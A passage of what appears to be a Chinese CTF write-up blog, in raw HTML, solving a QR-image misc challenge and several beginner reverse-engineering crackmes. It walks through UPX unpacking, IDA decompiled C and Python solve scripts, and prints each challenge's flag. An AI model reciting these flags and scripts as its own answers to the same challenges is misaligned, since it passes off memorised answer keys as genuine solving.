class="token punctuation">)</span> <span class="token keyword">as</span> data<span class="token punctuation">:</span>    a <span class="token operator">=</span> data<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        aa <span class="token operator">=</span> a<span class="token punctuation">[</span>x<span class="token operator">*</span><span class="token number">200</span> <span class="token operator">+</span> y<span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token number">200</span> <span class="token operator">+</span> y<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'255'</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">:</span>            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210606142548031.png" alt></p><p>用手机QQ扫一下得flag(QQ我滴超人)</p><pre class="line-numbers language-none"><code class="language-none">MRCTF&#123;ta01uyout1nreet1n0usandtimes&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="方向介绍与解题思路"><a href="#方向介绍与解题思路" class="headerlink" title="方向介绍与解题思路"></a>方向介绍与解题思路</h2><h3 id="方向的简单介绍"><a href="#方向的简单介绍" class="headerlink" title="方向的简单介绍"></a>方向的简单介绍</h3><p>reverse方向在实战中表现为计算机软件破解，有一般的c与c++作为反编译内容的破解、有基于c#的软件的破解、有基于java的逆向破解等等。</p><p>而在CTF中，reverse的出题模式一般有下面的几种</p><h3 id="一般的逆向题"><a href="#一般的逆向题" class="headerlink" title="一般的逆向题"></a>一般的逆向题</h3><h3 id="一般的迷宫题"><a href="#一般的迷宫题" class="headerlink" title="一般的迷宫题"></a>一般的迷宫题</h3><h2 id="一般逆向-啥都没有，简单的算法"><a href="#一般逆向-啥都没有，简单的算法" class="headerlink" title="一般逆向(啥都没有，简单的算法)"></a>一般逆向(啥都没有，简单的算法)</h2><h3 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h3><p>先查pe，注意到是UPX壳，直接拉到虚拟机内脱壳</p><p><img src="/2021/05/28/CTF/image-20210531101308798.png" alt="image-20210531101308798"></p><p>然后直接拖入ida32，跟踪到如下的主要代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _BYTE v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+12h] [ebp-2Eh] BYREF</span>  _DWORD v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Eh] [ebp-22h]</span>  _BYTE v6<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+2Ah] [ebp-16h] BYREF</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+2Fh] [ebp-11h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+33h] [ebp-Dh]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+37h] [ebp-9h]</span>  <span class="token keyword">char</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+3Bh] [ebp-5h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-4h]</span>  <span class="token function">sub_401A10</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"*F'\"N,\"(I?+@"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">65</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">67</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">84</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">70</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">123</span> <span class="token operator">||</span> v10 <span class="token operator">!=</span> <span class="token number">125</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> byte_402000<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一看就是简单的古典密码而已，直接脚本出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"*F'\"N,\"(I?+@"</span>dic <span class="token operator">=</span> <span class="token string">r"&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=&lt;;:9876543210/.-,+*)("</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x27</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;%$# !\""</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> dic<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;U9X_1S_W6@T?&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="buu、Youngter-drive"><a href="#buu、Youngter-drive" class="headerlink" title="buu、Youngter-drive"></a>buu、Youngter-drive</h3><p>首先给的是exe文件就先验验壳，UPX壳，直接脱了。</p><p>或者使用OD手工脱了，<a href="https://blog.csdn.net/kevin66654/article/details/79135861">关于OD的手工脱壳的教程</a>。</p><p>然后拉入ida32简单分析。注意到创建了两个单独的线程来进行加密，两个线程的函数分别为<code>StartAddress</code>、<code>sub_41119F</code>。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    HANDLE v4<span class="token punctuation">;</span> <span class="token comment">// [esp+D0h] [ebp-14h]</span>    HANDLE hObject<span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-8h]</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sub_4110FF<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">::</span>hObject <span class="token operator">=</span> <span class="token function">CreateMutexW</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">j_strcpy</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Source<span class="token punctuation">)</span><span class="token punctuation">;</span>        hObject <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> StartAddress<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v4 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sub_41119F<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hObject<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> dword_418008 <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">;</span>    <span class="token function">sub_411190</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span><span class="token operator">::</span>hObject<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然创建了两个线程，但是第二线程似乎只是为了Sleep而创建的，所以只有<code>StartAddress</code>函数是具有功能的。深入跟进该函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// positive sp value has been detected, the output may be wrong!</span><span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">sub_411940</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// eax</span>    <span class="token keyword">char</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+D3h] [ebp-5h]</span>    v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;</span> <span class="token number">97</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;</span> <span class="token number">65</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token number">97</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">122</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然最上面提示了堆栈不平衡，但是ida7.5依然分析出了该功能的c代码。上面的a2对应的就是那个一直在自减一的<code>dword_418008</code>，表示字符串的窗口挪动？而后面的那个线程似乎只做了字符串窗口移动的动作。这个应该是一个从后向前推导的过程，但是简单分析了一下，这样似乎不行，看了别人的wp，发现应该是后面还有一位的，这里进行验证的是29位，但是其实进行加密的是30位，这样就满足了，由此得出逆向的python脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">''</span>off_418000 <span class="token operator">=</span> <span class="token string">'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>off_418004 <span class="token operator">=</span> <span class="token string">'TOiZiZtOrYaToUwPnToBsOaOapsySy'</span>  <span class="token comment"># 在从ida得来的字符串的最后加上一位(随意的字符)，经测试，只有在第三十位字符是y的情况下得出的flag才是正确的</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>off_418004<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> off_418004<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">continue</span>    tmp <span class="token operator">=</span> off_418000<span class="token punctuation">.</span>index<span class="token punctuation">(</span>off_418004<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 用tmp的值代表检验字符串在加密表字符串的位置(下标)</span>    <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">96</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># ThisisthreadofwindowshahaIsESE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后一位是y时得到的flag才是正确的。。。</p><p>另外加密的时候<code>*(_BYTE *)(a2 + a1)</code>代表的是地址，所以后面的<code>*(char *)(a2 + a1)</code>应该也是地址类似的东西，在数组里面也只有下标了，总之这道题做得挺蒙的。。。</p><h3 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h3><p><strong>TAG:换表base64、大小写互相转换</strong></p><p>查壳无壳</p><p><img src="/2021/05/28/CTF/image-20210607180229271.png" alt></p><p>直接先使用ida32打开看一看</p><p><img src="/2021/05/28/CTF/image-20210607180359872.png" alt></p><p>找到关键的字符串，一路跟踪进去发现关键函数，内容如下(其实就是逆出来的main函数)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-74h] BYREF</span>  __int16 v6<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-68h]</span>  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+16h] [ebp-66h]</span>  <span class="token keyword">char</span> v8<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-64h] BYREF</span>  <span class="token function">sub_403CF8</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_40E140<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_401080</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token operator">==</span> byte_40E0E4<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v3 <span class="token operator">></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aError<span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_6<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span>byte_40E0E4<span class="token punctuation">)</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aAreYouHappyYes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aAreYouHappyNo<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看前面的这个函数</p><p><img src="/2021/05/28/CTF/image-20210607192629739.png" alt></p><p>跟进函数内部，很容易发现这就是一个换表的base64，原始的表为</p><pre class="line-numbers language-none"><code class="language-none">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意到引用这串字符串的，有个函数专门用来换表，函数的内容如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment">// cl</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> result <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> result <span class="token operator">&lt;</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>result <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v1 <span class="token operator">=</span> byte_40E0AA<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>    byte_40E0AA<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> byte_40E0A0<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>    byte_40E0A0<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到上面<code>byte_40E0A0</code>和<code>byte_40E0A0</code>交换位置，ez，意思就是对原始的表从第六位开始和原始的表的第15位开始后的9位进行调换位置即可。</p><p>然后就是最后的这个了，一般情况下进行base的时候应该是没有这个的，这个逆出了这个说明有问题</p><p><img src="/2021/05/28/CTF/image-20210607194310914.png" alt></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">sub_401030</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment">// al</span>  v1 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      v2 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token string">'z'</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> v2 <span 